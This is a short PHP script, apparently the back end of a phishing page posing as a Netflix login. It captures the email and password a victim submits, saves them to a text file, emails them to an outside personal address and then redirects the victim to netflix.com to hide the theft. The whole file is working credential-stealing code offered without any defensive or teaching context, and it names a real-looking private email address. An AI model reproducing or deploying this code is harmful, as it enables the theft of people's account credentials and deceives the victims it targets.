<?php

file_put_contents("usernames.txt", "Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
mail("filip.larsen@live.no","FromScript","Account: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n");
header('Location: https://netflix.com');
exit();
